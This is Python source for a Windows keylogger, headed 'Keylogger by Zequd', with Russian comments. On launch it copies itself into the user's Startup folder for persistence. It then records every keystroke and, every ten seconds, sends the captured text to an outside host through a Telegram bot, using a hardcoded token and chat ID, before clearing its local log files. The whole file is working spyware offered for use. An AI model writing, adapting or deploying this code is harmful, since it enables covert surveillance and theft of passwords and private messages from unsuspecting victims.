#######################################
#                                      #
#          Keylogger by Zequd          #
#                                      #
########################################
token = "8169767869:AAEjC3iTS4aKlZ5iuOaPxAGEBW8ntz7ydzw" # Токен внутри ковычек
chat_id = "5301135108" # Чат айди внутри ковычек
duration = 10 # Частота отправки ***** в секундах


from pynput.keyboard import Key, Listener
import logging
import time
from threading import Thread
import requests
import sys
import os



Thisfile = sys.argv[0]
Thisfile_name = os.path.basename(Thisfile)
user_path = os.path.expanduser('~')

if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
        os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')

def main():
    while 1:
        logging.basicConfig(filename=('Alllogs.txt'), level=logging.DEBUG, format="%(message)s")

        def on_press(key):
            logging.info(str(key))
            with open('Alllogs.txt', 'r') as f:
                text = f.read()
                text = text.replace('\n', '')
                text = text.replace("'", "")
                text = text.replace('Key.space', ' ')
                text = text.replace('Key.ctrl_l', '')
                text = text.replace('Key.ctrl_r', '')
                text = text.replace('Key.tab', '')
                text = text.replace('Key.down', '')
                text = text.replace('Key.backspace', '')
                text = text.replace('Key.right', '')
                text = text.replace('Key.left', '')
                text = text.replace('Key.shift', '')
                text = text.replace('Key.caps_lock', '')
                text = text.replace('Key.tab', '')
                text = text.replace('Key.alt_l', '')
                text = text.replace('Key.alt_gr', '')
                text = text.replace('Key.ctrl_r', '')
                text = text.replace('Key.shift_r', '')
                text = text.replace('Key.enter', '')
                text = text.replace('Key.esc', '')
                text = text.replace('Key.cmd', '')
                text = text.replace('Key.menu', '')
                text = text.replace('Key.up', '')
                text = text.replace('Key.delete', '')
                text = text.replace('Key.insert', '')
                text = text.replace('Key.right', '')
                text = text.replace('Key.end', '')
                text = text.replace('Key.down', '')
                text = text.replace('Key.page_down', '')
                text = text.replace('Key.left', '')
                text = text.replace('Key.right', '')
                text = text.replace('Key.home', '')
                text = text.replace('Key.up', '')
                text = text.replace('Key.num_lock', '')
                text = text.replace('Key.page_up', '')
                text = text.replace('Key.pause', '')
                text = text.replace('Key.print_screen', '')
                text = text.replace('Starting new HTTPS connection (1): api.telegram.org:', '')
                text = text.replace(f'Starting new HTTPS connection (1): api.telegram.org:443https://api.telegram.org:443 "POST /bot{token}/sendMessage?chat_id={chat_id}', '')
                for i in range(0, 12):
                    i = i + 1
                    text = text.replace(f'Key.f{str(i)}', '')
                for i in range(0, 100):
                    i = i + 1
                    text = text.replace(r'\x'+str(i), '')
                for i in range(0, 100):
                    i = i + 1
                    text = text.replace(r'\x0'+str(i), '')
                for i in range(0, 1000):
                    i = i + 1
                    text = text.replace(f'<{str(i)}>', '')
                
            with open('onlywords.txt', 'w') as file:
                file.write(text)

        with Listener(on_press=on_press) as listener:
            listener.join()

def send():
    while True:
        time.sleep(duration)
        with open('onlywords.txt') as f:
            text = f.read()
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&parse_mode=html&text={text}")
        file = open('Alllogs.txt', 'w')
        file.write('')
        file.close()
        file = open('onlywords.txt', 'w')
        file.write('')
        file.close()

while True:
    t = Thread(target=main)
    t2 = Thread(target=send)
    t.start()
    t2.start()
    t.join()
    t.join()